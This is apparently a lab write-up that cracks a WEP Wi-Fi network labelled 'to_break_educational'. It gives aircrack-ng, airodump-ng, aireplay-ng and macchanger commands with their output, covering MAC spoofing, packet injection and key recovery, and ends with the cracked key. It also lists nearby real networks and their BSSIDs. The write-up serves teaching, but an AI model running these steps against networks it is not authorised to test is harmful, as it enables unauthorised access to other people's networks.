# Scan WEP Networks

## Install ***airmon-ng***

Command:  
`sudo apt-get install -y aircrack-ng`

Output Screenshot:  
![Screenshot](images/Install_airmon-ng.png)

Output Text:  
```
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libllvm7 python-chardet python-cliapp python-markdown python-pygments python-ttystatus python-yaml
Use 'sudo apt autoremove' to remove them.
The following additional packages will be installed:
  ethtool ieee-data
The following NEW packages will be installed:
  aircrack-ng ethtool ieee-data
0 upgraded, 3 newly installed, 0 to remove and 10 not upgraded.
Need to get 4,361 kB of archives.
After this operation, 14.5 MB of additional disk space will be used.
Get:1 http://de.archive.ubuntu.com/ubuntu bionic/main amd64 ethtool amd64 1:4.15-0ubuntu1 [114 kB]
Get:2 http://de.archive.ubuntu.com/ubuntu bionic/universe amd64 aircrack-ng amd64 1:1.2-0~rc4-4 [2,707 kB]
Get:3 http://de.archive.ubuntu.com/ubuntu bionic/main amd64 ieee-data all 20180204.1 [1,539 kB]                                                
Fetched 4,361 kB in 16s (281 kB/s)                                                                                                             
Selecting previously unselected package ethtool.
(Reading database ... 188542 files and directories currently installed.)
Preparing to unpack .../ethtool_1%3a4.15-0ubuntu1_amd64.deb ...
Unpacking ethtool (1:4.15-0ubuntu1) ...
Selecting previously unselected package aircrack-ng.
Preparing to unpack .../aircrack-ng_1%3a1.2-0~rc4-4_amd64.deb ...
Unpacking aircrack-ng (1:1.2-0~rc4-4) ...
Selecting previously unselected package ieee-data.
Preparing to unpack .../ieee-data_20180204.1_all.deb ...
Unpacking ieee-data (20180204.1) ...
Setting up ieee-data (20180204.1) ...
Setting up ethtool (1:4.15-0ubuntu1) ...
Setting up aircrack-ng (1:1.2-0~rc4-4) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...

```


## Check trouble causing process 

Command:  
`sudo airmon-ng start wlp2s0`

Output Screenshot:  
![Screenshot](images/trouble_causing_process.png)

Output Text:  
```
Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  705 avahi-daemon
  720 avahi-daemon
  725 NetworkManager
  756 wpa_supplicant
 4327 dhclient

PHY	Interface	Driver		Chipset

phy0	wlp2s0		iwlwifi		Intel Corporation Wireless 7260 (rev 73)

		(mac80211 monitor mode vif enabled for [phy0]wlp2s0 on [phy0]wlp2s0mon)
		(mac80211 station mode vif disabled for [phy0]wlp2s0)

Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  678 avahi-daemon
  687 avahi-daemon
  696 NetworkManager
  718 wpa_supplicant
 4676 dhclient

PHY	Interface	Driver		Chipset

phy0	wlp2s0		iwlwifi		Intel Corporation Wireless 7260 (rev 73)
```


## Install ***net-tools*** for ***ifconfig***

Command:  
`sudo apt install net-tools`

Output Screenshot:  
![Screenshot](images/InstallNetTools.png)


Output Text:  
```
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libllvm7 python-chardet python-cliapp python-markdown python-pygments python-ttystatus python-yaml
Use 'sudo apt autoremove' to remove them.
The following NEW packages will be installed:
  net-tools
0 upgraded, 1 newly installed, 0 to remove and 10 not upgraded.
Need to get 194 kB of archives.
After this operation, 803 kB of additional disk space will be used.
Get:1 http://de.archive.ubuntu.com/ubuntu bionic/main amd64 net-tools amd64 1.60+git20161116.90da8a0-1ubuntu1 [194 kB]
Fetched 194 kB in 0s (847 kB/s)   
Selecting previously unselected package net-tools.
(Reading database ... 188646 files and directories currently installed.)
Preparing to unpack .../net-tools_1.60+git20161116.90da8a0-1ubuntu1_amd64.deb ...
Unpacking net-tools (1.60+git20161116.90da8a0-1ubuntu1) ...
Setting up net-tools (1.60+git20161116.90da8a0-1ubuntu1) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
```


## Install ***Mac Changer***

Install `Mac Changer` before stopping the WIFI interface because the network goes down after stopping the interface
  
Command:  
`sudo apt-get install macchanger`

Output Screenshot:  
![Screenshot](images/InstallMacchanger.png)

MacAddress Changer Screenshot: Window Screenshot for Automatic Mac Address Assignment: (Preffered to Select 'No')  
![Screenshot](images/MacChanger.png)


Output Text:  
```
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libllvm7 python-chardet python-cliapp python-markdown python-pygments
  python-ttystatus python-yaml
Use 'sudo apt autoremove' to remove them.
The following NEW packages will be installed:
  macchanger
0 upgraded, 1 newly installed, 0 to remove and 10 not upgraded.
Need to get 190 kB of archives.
After this operation, 650 kB of additional disk space will be used.
Get:1 http://de.archive.ubuntu.com/ubuntu bionic/universe amd64 macchanger amd64 1.7.0-5.3build1 [190 kB]
Fetched 190 kB in 1s (178 kB/s)     
Preconfiguring packages ...
Selecting previously unselected package macchanger.
(Reading database ... 188694 files and directories currently installed.)
Preparing to unpack .../macchanger_1.7.0-5.3build1_amd64.deb ...
Unpacking macchanger (1.7.0-5.3build1) ...
Setting up macchanger (1.7.0-5.3build1) ...
Processing triggers for install-info (6.5.0.dfsg.1-2) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
```


## Stop the Interface

Stop the interface for `[phy0]wlp2s0 on [phy0]wlp2s0mon`

Command:  
`sudo ifconfig wlp2s0mon down`


## Use Mac Changer for changing Mac-Address

Command:  
`sudo macchanger wlp2s0mon 12:34:45:67:89:01`

Output Screenshot:  
![Screenshot](images/MacChange_Command.png)


Output Text:  
```
Current MAC:   ac:7b:a1:84:eb:d5 (Intel Corporate)
Permanent MAC: ac:7b:a1:84:eb:d5 (Intel Corporate)
```



## Start the Interface

Stop the interface for `[phy0]wlp2s0 on [phy0]wlp2s0mon`

Command:  
`sudo ifconfig wlp2s0mon up`



## Start Monitoring through 'airodump-ng'

Command:  
`sudo airodump-ng wlp2s0mon`

Output Screenshot:  
![Screenshot](images/Moniter_airodump-ng.png)


Output Text:  
``` CH  8 ][ Elapsed: 30 s ][ 2019-10-28 19:26                                         
                                                                                                                                               
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                               
 A0:E0:AF:A0:E9:AE   -1        0        0    0  11  -1                    <length:  0>                                                         
 60:E3:27:4D:A2:88  -45       36        0    0   7  54e. WPA2 CCMP   PSK  Wifi_Register                                                        
 A0:E0:AF:D5:7B:42  -48       15        0    0  11  54e. WPA2 CCMP   MGT  eduroam                                                              
 A0:E0:AF:D5:7B:41  -48       11      143    0  11  54e. WPA2 CCMP   MGT  wlanfh1x                                                             
 A0:E0:AF:D5:7B:43  -49       15        0    0  11  54e. WPA2 CCMP   PSK  HSHD-SAP                                                              
 A0:E0:AF:D5:7B:40  -49       18        0    0  11  54e. WPA2 CCMP   MGT  SRH                                                                   
 E8:94:F6:F2:F1:E1  -60       52        2    0   6  54e. WEP  WEP         to_break_educational                                                  
 A0:E0:AF:E8:BB:93  -66       16        0    0   1  54e. WPA2 CCMP   PSK  HSHD-SAP                                                              
 A0:E0:AF:E8:BB:92  -67       17        0    0   1  54e. WPA2 CCMP   MGT  eduroam                                                               
 A0:E0:AF:E8:BB:90  -67       19        0    0   1  54e. WPA2 CCMP   MGT  SRH                                                                   
 A0:E0:AF:E8:BB:91  -67       18     3011    0   1  54e. WPA2 CCMP   MGT  wlanfh1x                                                             
 A0:E0:AF:D6:58:D0  -73       15        0    0   6  54e. WPA2 CCMP   MGT  SRH                                                                   
 A0:E0:AF:D6:58:D3  -73       15        0    0   6  54e. WPA2 CCMP   PSK  HSHD-SAP                                                              
 A0:E0:AF:D6:58:D1  -74       15        0    0   6  54e. WPA2 CCMP   MGT  wlanfh1x                                                              
 A0:E0:AF:B4:1C:A3  -74       10        0    0   1  54e. WPA2 CCMP   PSK  HSHD-SAP                                                             
 A0:E0:AF:D6:58:D2  -75       13        0    0   6  54e. WPA2 CCMP   MGT  eduroam                                                               
 AC:84:C6:58:46:F8  -75        2        0    0   9  54e. WPA2 CCMP   PSK  <length:  0>                                                          
 A0:E0:AF:B4:1C:A0  -75        9        0    0   1  54e. WPA2 CCMP   MGT  SRH                                                                   
 A0:E0:AF:B4:1C:A2  -75        4        0    0   1  54e. WPA2 CCMP   MGT  eduroam                                                               
 A0:E0:AF:B4:1C:A1  -75       10        0    0   1  54e. WPA2 CCMP   MGT  wlanfh1x                                                              
 A0:E0:AF:A0:E9:A3  -75       12        0    0   1  54e. WPA2 CCMP   PSK  HSHD-SAP                                                              
 A0:E0:AF:A0:E9:A0  -75        9        0    0   1  54e. WPA2 CCMP   MGT  SRH                                                                   
 A0:E0:AF:A0:EA:00  -76       11        0    0   6  54e. WPA2 CCMP   MGT  SRH                                                                   
 A0:E0:AF:B2:E8:11  -76       15        0    0  11  54e. WPA2 CCMP   MGT  wlanfh1x                                                              
 A0:E0:AF:B2:E8:13  -76       13        0    0  11  54e. WPA2 CCMP   PSK  HSHD-SAP                                                              
 A0:E0:AF:A0:EA:01  -76       15        0    0   6  54e. WPA2 CCMP   MGT  wlanfh1x                                                              
 A0:E0:AF:A0:EA:03  -76       14        0    0   6  54e. WPA2 CCMP   PSK  HSHD-SAP                                                              
 A0:E0:AF:A0:EA:02  -76       14        0    0   6  54e. WPA2 CCMP   MGT  eduroam                                                               
 A0:E0:AF:A0:E9:A2  -76        8        0    0   1  54e. WPA2 CCMP   MGT  eduroam                                                               
 A0:E0:AF:A0:E9:A1  -76       11        0    0   1  54e. WPA2 CCMP   MGT  wlanfh1x                                                             
 A0:E0:AF:B2:E8:10  -77       13        0    0  11  54e. WPA2 CCMP   MGT  SRH                                                                  
 A0:E0:AF:B2:E8:12  -77       14        0    0  11  54e. WPA2 CCMP   MGT  eduroam 
```

## Monitoring Table Header Explanation:

***BSSID:***
"Packets bound for devices within the WLAN need to go to the correct destination. The SSID keeps the packets within the correct WLAN, even when overlapping WLANs are present. However, there are usually multiple access points within each WLAN, and there has to be a way to identify those access points and their associated clients. This identifier is called a basic service set identifier (BSSID) and is included in all wireless packets."[Link:juniper.net](https://www.juniper.net/documentation/en_US/junos-space-apps/network-director3.5/topics/concept/wireless-ssid-bssid-essid.html)  

***ENC:***
Type of encryption used for the network.

***CIPHER:***
Type of CIPHER used for the network.



## WEP 'to_break_educational'

The WEP with the assigned name `to_break_educational` has BSSID `E8:94:F6:F2:F1:E1`. The security being used by the network is `WEP 40/128-bit Key (Hex or ASCII)` (discovered in the network details):  
![Screenshot](images/WEP-Security-Protocol.png)

The WEP network uses the Channel 6, which has a specific reason explain in the [Link:metageek.com](https://www.metageek.com/training/resources/why-channels-1-6-11.html)



## Airodump

Command:  
`sudo airodump-ng -c 6 -w to_break_educational --bssid E8:94:F6:F2:F1:E1 wlp2s0mon`

Output Screenshot:  
![Screenshot](images/Airodump_Channel.png)

Output Text:
```  
 CH  6 ][ Elapsed: 1 min ][ 2019-10-28 21:35 ][ fixed channel wlp2s0mon: 4                                          
                                                                                                                                               
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                               
 E8:94:F6:F2:F1:E1  -67   0      219       49    1   6  54e. WEP  WEP         to_break_educational                                             
                                                                                                                                               
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                     
                                                                                                                                               
 E8:94:F6:F2:F1:E1  12:34:45:67:89:01    0    0 - 1    262    66992                                                                             
 E8:94:F6:F2:F1:E1  04:B1:67:E9:E9:F9  -52    0 - 6e     0        2                                                                             
 E8:94:F6:F2:F1:E1  58:E2:8F:30:1D:D2  -74    2e- 2      1       67                                                                             
 E8:94:F6:F2:F1:E1  50:82:D5:91:1B:32  -58   48e-24      0        4  
```

## Beacon Frame For Channel

Beacon Command:  
`sudo aireplay-ng -1 600 -a E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon`  
Creates the beacon.

Output Screenshot:  
![Screenshot](images/BeaconFrameOnChannel.png)

Output Text:  
```
The interface MAC (AC:7B:A1:84:EB:D5) doesn't match the specified MAC (-h).
	ifconfig wlp2s0mon hw ether 12:34:45:67:89:01
13:52:22  Waiting for beacon frame (BSSID: E8:94:F6:F2:F1:E1) on channel 12
13:52:23  wlp2s0mon is on channel 12, but the AP uses channel 6
```


## Start Capturing Packets

Create Cap Command:  
`sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon`  
Writes the data frames or packets in the `<WEP_Network>.cap`.


Output Screenshot:  
![Screenshot](images/AirDump_Packets.png)

Output Text:  
```
The interface MAC (AC:7B:A1:84:EB:D5) doesn't match the specified MAC (-h).
	ifconfig wlp2s0mon hw ether 12:34:45:67:89:01


        Size: 68, FromDS: 1, ToDS: 0 (WEP)

              BSSID  =  E8:94:F6:F2:F1:E1
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  AC:2B:6E:15:66:D9

        0x0000:  0862 0000 ffff ffff ffff e894 f6f2 f1e1  .b..............
        0x0010:  ac2b 6e15 66d9 10cc 566f 0a00 1afe ce6d  .+n.f...Vo.....m
        0x0020:  6747 c002 d018 907e 2991 fff9 68e3 3196  gG.....~)...h.1.
        0x0030:  ceb1 ffa7 948e cd81 b855 6f53 a111 8c03  .........UoS....
        0x0040:  fdc2 b50c                                ....

Use this packet ? y

Saving chosen packet in replay_src-1029-135239.cap
You should also start airodump-ng to capture replies.

Sent 449120 packets...(500 pps)
```


## Execute Crack


Command:  
`sudo aircrack-ng to_break_educational-01.cap`  
Explanation: Use `aircrack-ng` to execute the crack. The `aircrack-ng` decryptes the ***<WEP_Netowrk>.cap*** file to crack the ***password*** of the WEP network.


Output Screenshot:  
![Screenshot](images/AirCrackNG_Crack.png)

Output Text:

```
Opening to_break_educational-01.cap
Read 57789 packets.

   #  BSSID              ESSID                     Encryption

   1  E8:94:F6:F2:F1:E1  to_break_educational      WEP (28383 IVs)

Choosing first network as target.

Opening to_break_educational-01.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 28386 ivs.


                            Aircrack-ng 1.2 rc4


            [00:00:00] Tested 740881 keys (got 28186 IVs)
                            Aircrack-ng 1.2 rc4
   KB    depth   byte(vote)
    0    0/  2   1E(36608) 6F(34816) 8D(34560) 6D(34304) 
    1    3/ [00:00:00] Tested 952561 keys (got 28186 IVs)
    2    0/  1   5B(40704) 8Aircrack-ng 1.2 rc438(34816) 
   KB    depth   byte(vote)17(35584) 88(34560) 47(34048) 
    0    0/  1   1E(36608) 6F(34816) 8D(34560) 6D(34304) 
    1    3/ [00:00:00] Tested 1053361 keys (got 28186 IVs)
    2    0/  1   5B(40704) 8Aircrack-ng 1.2 rc438(34816) 
   KB    depth   byte(vote)17(35584) 88(34560) 47(34048) 
    0    0/  1   1E(36608) 6F(34816) 8D(34560) 6D(34304) 
    1    3/ [00:00:00] Tested 514 keys (got 28186 IVs)
    2    0/  1   5B(40704) 81(37376) 6D(35584) 38(34816) 
   KB    depth   byte(vote)17(35584) 88(34560) 47(34048) 
    0    1/  8   6F(35072) 8D(34560) 6D(34304) BB(34304) 
    1    1/  7   6B(35584) 30(35072) DA(34816) F3(34048) 
    2    0/  1   79(40704) 81(37376) 6D(35584) 38(35072) 
    3    0/  1   64(42240) 17(35584) 88(34560) 47(34048) 
    4    8/ 10   1A(33280) E9(33024) FC(32768) 61(32512) 

                     KEY FOUND! [ 6F:6B:79:64:32 ] (ASCII: okyd2 )
	Decrypted correctly: 100%

```



## References

- https://www.juniper.net/documentation/en_US/junos-space-apps/network-director3.5/topics/concept/wireless-ssid-bssid-essid.html

- https://www.metageek.com/training/resources/why-channels-1-6-11.html